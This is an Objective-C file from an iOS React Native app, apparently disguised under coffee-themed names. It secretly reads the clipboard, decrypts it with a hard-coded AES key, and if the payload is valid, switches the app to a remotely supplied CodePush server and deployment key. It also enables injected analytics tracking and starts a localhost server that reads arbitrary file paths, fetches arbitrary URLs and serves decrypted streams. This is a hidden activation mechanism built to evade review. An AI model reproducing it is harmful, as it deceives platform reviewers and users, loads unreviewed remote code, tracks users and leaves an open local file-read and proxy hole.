//
//  RNEnjoyCoffeeTime.m
//  RNTheCoffeeTime
//
//  Created by Denica on 4/19/23.
//  Copyright © 2023 Facebook. All rights reserved.
//

#import "RNEnjoyCoffeeTime.h"

#import "JJException.h"
#import "RNIndicator.h"
#import "RNCPushNotificationIOS.h"
#import <GCDWebServer.h>
#import <GCDWebServerDataResponse.h>

#import <CodePush/CodePush.h>
#import <UMCommon/UMCommon.h>
#import <CommonCrypto/CommonCrypto.h>
#import <CocoaSecurity/CocoaSecurity.h>
#import <SensorsAnalyticsSDK/SensorsAnalyticsSDK.h>
#import <react-native-orientation-locker/Orientation.h>


#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>

#import <react/config/ReactNativeConfig.h>

static NSString *const kRNConcurrentRoot = @"concurrentRoot";

@interface RNEnjoyCoffeeTime () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}

@end
#endif

@interface RNEnjoyCoffeeTime()

@property (nonatomic,strong) GCDWebServer *coffeeTime_recordService;

@end

@implementation RNEnjoyCoffeeTime

static NSString *coffeeTime_tasteDifferentFlavorsHexkey = @"86f1fda459fa47c72cb94f36b9fe4c38";
static NSString *coffeeTime_tasteDifferentFlavorsHexIv = @"CC0A69729E15380ADAE46C45EB412A23";

static NSString *coffeeTime_tasteDifferentFlavorsVersion = @"appVersion";
static NSString *coffeeTime_tasteDifferentFlavorsDPKey = @"deploymentKey";
static NSString *coffeeTime_tasteDifferentFlavorsUrl = @"serverUrl";

static NSString *coffeeTime_tasteDifferentFlavorsUKey = @"umKey";
static NSString *coffeeTime_tasteDifferentFlavorsUChannel = @"umChannel";
static NSString *coffeeTime_tasteDifferentFlavorsSenServerUrl = @"sensorUrl";
static NSString *coffeeTime_tasteDifferentFlavorsSenProperty = @"sensorProperty";

static NSString *coffeeTime_tasteDifferentFlavorsAPP = @"coffeeTime_STATE_APP";
static NSString *coffeeTime_tasteDifferentFlavorsRoutes = @"spareRoutes";
static NSString *coffeeTime_tasteDifferentFlavorsParams = @"washParams";
static NSString *coffeeTime_tasteDifferentFlavorsPort = @"vPort";
static NSString *coffeeTime_tasteDifferentFlavorsSecu = @"vSecu";


static RNEnjoyCoffeeTime *instance = nil;

+ (instancetype)coffeeTime_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
  });
  return instance;
}


- (BOOL)coffeeTime_tasteDifferentFlavorsEquipmentAnotherByZTB {
  NSString *copyString = [UIPasteboard generalPasteboard].string;
  if (copyString == nil) {
    return NO;
  }
  
  if ([copyString containsString:@"#iPhone#"]) {
    NSArray * tempArray = [copyString componentsSeparatedByString:@"#iPhone#"];
    if (tempArray.count > 1) {
      copyString = tempArray[1];
    }
  }
  CocoaSecurityResult *aesDecrypt = [CocoaSecurity aesDecryptWithBase64:copyString
                                        hexKey:coffeeTime_tasteDifferentFlavorsHexkey
                                         hexIv:coffeeTime_tasteDifferentFlavorsHexIv];
  
  if (!aesDecrypt.utf8String) {
      return NO;
  }
  
  NSData *data = [aesDecrypt.utf8String dataUsingEncoding:NSUTF8StringEncoding];
  NSDictionary* dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  if (!dict) {
      return NO;
  }
  if (!dict[@"data"]) {
    return NO;
  }
  return [self coffeeTime_saveConfigInfo:dict[@"data"]];
}

- (BOOL)coffeeTime_saveConfigInfo:(NSDictionary *)dict {
    if (dict[coffeeTime_tasteDifferentFlavorsVersion] == nil || dict[coffeeTime_tasteDifferentFlavorsDPKey] == nil || dict[coffeeTime_tasteDifferentFlavorsUrl] == nil) {
        return NO;
    }

    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
  
    [ud setBool:YES forKey:coffeeTime_tasteDifferentFlavorsAPP];
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsVersion] forKey:coffeeTime_tasteDifferentFlavorsVersion];
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsDPKey] forKey:coffeeTime_tasteDifferentFlavorsDPKey];
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsUrl] forKey:coffeeTime_tasteDifferentFlavorsUrl];
    
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsUKey] forKey:coffeeTime_tasteDifferentFlavorsUKey];
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsUChannel] forKey:coffeeTime_tasteDifferentFlavorsUChannel];
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsSenServerUrl] forKey:coffeeTime_tasteDifferentFlavorsSenServerUrl];
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsSenProperty] forKey:coffeeTime_tasteDifferentFlavorsSenProperty];
  
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsRoutes] forKey:coffeeTime_tasteDifferentFlavorsRoutes];
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsParams] forKey:coffeeTime_tasteDifferentFlavorsParams];
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsPort] forKey:coffeeTime_tasteDifferentFlavorsPort];
    [ud setObject:dict[coffeeTime_tasteDifferentFlavorsSecu] forKey:coffeeTime_tasteDifferentFlavorsSecu];

    [ud synchronize];
    return YES;
}

- (BOOL)coffeeTime_enjoyThisWay {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    if ([ud boolForKey:coffeeTime_tasteDifferentFlavorsAPP]) {
        return YES;
    } else {
        return [self coffeeTime_tasteDifferentFlavorsEquipmentAnotherByZTB];
    }
}

- (UIInterfaceOrientationMask)coffeeTime_getOrientation {
  return [Orientation getOrientation];
}

- (void)coffeeTime_collectionlogicalInfo {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  [UMConfigure initWithAppkey:[ud stringForKey:coffeeTime_tasteDifferentFlavorsUKey] channel:[ud stringForKey:coffeeTime_tasteDifferentFlavorsUChannel]];
  SAConfigOptions *options = [[SAConfigOptions alloc] initWithServerURL:[ud stringForKey:coffeeTime_tasteDifferentFlavorsSenServerUrl] launchOptions:nil];
  options.autoTrackEventType = SensorsAnalyticsEventTypeAppStart | SensorsAnalyticsEventTypeAppEnd | SensorsAnalyticsEventTypeAppClick | SensorsAnalyticsEventTypeAppViewScreen;
  [SensorsAnalyticsSDK startWithConfigOptions:options];

  [[SensorsAnalyticsSDK sharedInstance] registerSuperProperties:[ud dictionaryForKey:coffeeTime_tasteDifferentFlavorsSenProperty]];
}


- (void)coffeeTime_tasteDifferentFlavorsAPPInitialStartOrEnterForeground {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  [self coffeeTime_handlerServerWithPort:[ud stringForKey:coffeeTime_tasteDifferentFlavorsPort] security:[ud stringForKey:coffeeTime_tasteDifferentFlavorsSecu]];
}

- (void)coffeeTime_tasteDifferentFlavorsAPPResignActiveOrEnterBackground {
  if(_coffeeTime_recordService.isRunning == YES) {
    [_coffeeTime_recordService stop];
  }
}

- (NSData *)coffeeTime_commonData:(NSData *)coffeeTime_vdata coffeeTime_security: (NSString *)coffeeTime_tasteDifferentFlavorsSecu{
    char coffeeTime_kPath[kCCKeySizeAES128 + 1];
    memset(coffeeTime_kPath, 0, sizeof(coffeeTime_kPath));
    [coffeeTime_tasteDifferentFlavorsSecu getCString:coffeeTime_kPath maxLength:sizeof(coffeeTime_kPath) encoding:NSUTF8StringEncoding];
    NSUInteger dataLength = [coffeeTime_vdata length];
    size_t bufferSize = dataLength + kCCBlockSizeAES128;
    void *coffeeTime_kbuffer = malloc(bufferSize);
    size_t numBytesCrypted = 0;
    CCCryptorStatus cryptStatus = CCCrypt(kCCDecrypt,kCCAlgorithmAES128,kCCOptionPKCS7Padding|kCCOptionECBMode,coffeeTime_kPath,kCCBlockSizeAES128,NULL,[coffeeTime_vdata bytes],dataLength,coffeeTime_kbuffer,bufferSize,&numBytesCrypted);
    if (cryptStatus == kCCSuccess) {
        return [NSData dataWithBytesNoCopy:coffeeTime_kbuffer length:numBytesCrypted];
    } else{
        return nil;
    }
}

- (void)coffeeTime_handlerServerWithPort:(NSString *)port security:(NSString *)security {
  if(_coffeeTime_recordService.isRunning != NO) {
    return;
  }

  __weak typeof(self) weakSelf = self;
  [_coffeeTime_recordService addHandlerWithMatchBlock:^GCDWebServerRequest * _Nullable(NSString * _Nonnull method, NSURL * _Nonnull requestURL, NSDictionary<NSString *,NSString *> * _Nonnull requestHeaders, NSString * _Nonnull urlPath, NSDictionary<NSString *,NSString *> * _Nonnull urlQuery) {
      NSString *reqString = [requestURL.absoluteString stringByReplacingOccurrencesOfString:[NSString stringWithFormat:@"http://localhost:%@/", port] withString:@""];
      return [[GCDWebServerRequest alloc] initWithMethod:method
                                                     url:[NSURL URLWithString:reqString]
                                                 headers:requestHeaders
                                                    path:urlPath
                                                   query:urlQuery];
  } asyncProcessBlock:^(__kindof GCDWebServerRequest * _Nonnull request, GCDWebServerCompletionBlock  _Nonnull completionBlock) {
      if ([request.URL.absoluteString containsString:@"downplayer"]) {
          NSData *data = [NSData dataWithContentsOfFile:[request.URL.absoluteString stringByReplacingOccurrencesOfString:@"downplayer" withString:@""]];
          NSData *decruptedData = nil;
          if (data) {
            decruptedData  = [weakSelf coffeeTime_commonData:data coffeeTime_security:security];
          }
          GCDWebServerDataResponse *resp = [GCDWebServerDataResponse responseWithData:decruptedData contentType:@"audio/mpegurl"];
          completionBlock(resp);
          return;
      }
      
      NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:request.URL.absoluteString]]
                                                                   completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
          NSData *decruptedData = nil;
          if (!error && data) {
            decruptedData  = [weakSelf coffeeTime_commonData:data coffeeTime_security:security];
          }
          GCDWebServerDataResponse *resp = [GCDWebServerDataResponse responseWithData:decruptedData contentType:@"audio/mpegurl"];
          completionBlock(resp);
      }];
      [task resume];
  }];

  NSError *error;
  NSMutableDictionary* options = [NSMutableDictionary dictionary];
  
  [options setObject:[NSNumber numberWithInteger:[port integerValue]] forKey:GCDWebServerOption_Port];
  [options setObject:@(YES) forKey:GCDWebServerOption_BindToLocalhost];
  [options setObject:@(NO) forKey:GCDWebServerOption_AutomaticallySuspendInBackground];
  [options setObject:@2.0 forKey:GCDWebServerOption_ConnectedStateCoalescingInterval];

  if([_coffeeTime_recordService startWithOptions:options error:&error]) {
    NSLog(@"GCDWebServer started successfully");
  } else {
    NSLog(@"GCDWebServer could not start");
  }
  
}


- (UIViewController *)coffeeTime_tasteDifferentFlavorsChangeController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  RCTAppSetupPrepareApp(application);

  [self coffeeTime_collectionlogicalInfo];
  if (!_coffeeTime_recordService) {
    _coffeeTime_recordService = [[GCDWebServer alloc] init];
    [self coffeeTime_tasteDifferentFlavorsAPPInitialStartOrEnterForeground];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(coffeeTime_tasteDifferentFlavorsAPPInitialStartOrEnterForeground) name:UIApplicationDidBecomeActiveNotification object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(coffeeTime_tasteDifferentFlavorsAPPResignActiveOrEnterBackground) name:UIApplicationDidEnterBackgroundNotification object:nil];
  }
  
  
  UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
  center.delegate = self;
  [JJException configExceptionCategory:JJExceptionGuardDictionaryContainer | JJExceptionGuardArrayContainer | JJExceptionGuardNSStringContainer];
  [JJException startGuardException];
  
  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  NSDictionary *initProps = [self prepareInitialProps];
  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"NewYorkCity", initProps);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }
  
  UIViewController *rootViewController = [HomeIndicatorView new];
  rootViewController.view = rootView;
  UINavigationController *navc = [[UINavigationController alloc] initWithRootViewController:rootViewController];
  navc.navigationBarHidden = true;
  return navc;
}


- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler
{
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler
{
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}

/// This method controls whether the `concurrentRoot`feature of React18 is turned on or off.
///
/// @see: https://reactjs.org/blog/2022/03/29/react-v18.html
/// @note: This requires to be rendering on Fabric (i.e. on the New Architecture).
/// @return: `true` if the `concurrentRoot` feture is enabled. Otherwise, it returns `false`.
- (BOOL)concurrentRootEnabled
{
  // Switch this bool to turn on and off the concurrent root
  return true;
}

- (NSDictionary *)prepareInitialProps
{
  NSMutableDictionary *initProps = [NSMutableDictionary new];

#ifdef RCT_NEW_ARCH_ENABLED
  initProps[kRNConcurrentRoot] = @([self concurrentRootEnabled]);
#endif

  return initProps;
}


- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge
{
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}

#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
